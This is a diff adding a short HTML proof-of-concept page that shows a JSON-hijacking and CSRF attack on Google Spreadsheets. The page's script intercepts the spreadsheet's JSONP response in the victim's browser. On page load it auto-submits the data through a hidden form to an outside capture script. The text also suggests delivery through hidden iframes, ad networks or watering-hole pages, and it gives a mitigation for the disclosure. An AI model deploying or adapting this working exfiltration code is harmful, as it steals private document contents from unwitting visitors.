@@ -1,0 +1,64 @@
+<html>
+<head>
+
+	<script>
+		var google = new Object();
+		google.visualization = new Object();
+		google.visualization.Query = new Object();
+		
+		google.visualization.Query.setResponse = function(goods) {
+			google.response = JSON.stringify(goods, undefined, 2);
+			
+		}
+	</script>
+
+	<!-- Returns a Javascript statement with an embedded json string as an argument -->
+	<script type="text/javascript" src="https://docs.google.com/spreadsheets/d/1bWK2wx57QJLCsWh-jPQS07-2nkaiEaXPEDNGoVZwjOA/gviz/tq?headers=2&amp;range=A1:H&amp;sheet=Sheet1&amp;tqx=reqId%3A0"></script>
+	
+	<script>
+		function smuggle(goods) {
+			document.getElementById('cargo').innerText = goods;
+			
+			document.getElementById('hiddenCompartment').submit();
+		}
+	</script>
+	
+</head>
+
+<body onload="smuggle(google.response);">
+
+<pre>
+Rodney Beede
+2015-10-27
+https://www.rodneybeede.com/
+business2008+YouMustAddThisPlusPart<i>@NOSPAM</i>@rodneybeede (add the missing dot here) com
+</pre>
+
+<p>
+Uses JavaScript JSON loading to send the content via same idea as CSRF.  Combination of CSRF and JSON Hijacking.
+</p>
+
+<p>Requirements</p>
+<ol>
+<li>The attacker must know the target Google Spreadsheet file ID (not hard to obtain; this PoC limited on purpose to avoid script kiddies)</li>
+<li>Requires victim to be tricked into viewing the page content although it could be a hidden iframe.  Use of advertising networks is still an option too.  Watering hole attack</li>
+
+<p>
+Useful for an attacker who perhaps used to have access to a document but later had it revoked.  Think of a business employee no longer with the company.
+</p>
+
+<p>
+<b>Mitigation:</b>  After removing someone's access to a document make a copy of the existing document, delete (and purge from trash) the original, and reference only the new document's ID.  Also try not to visit sites with hidden content (hard in this age).
+</p>
+
+
+<form action="https://www.rodneybeede.com/simpleCapture.php" method="POST" id="hiddenCompartment">
+
+<textarea id="cargo" name="cargo" rows="35" cols="70">Drop it here</textarea>
+
+</form>
+
+</body>
+
+
+</html>
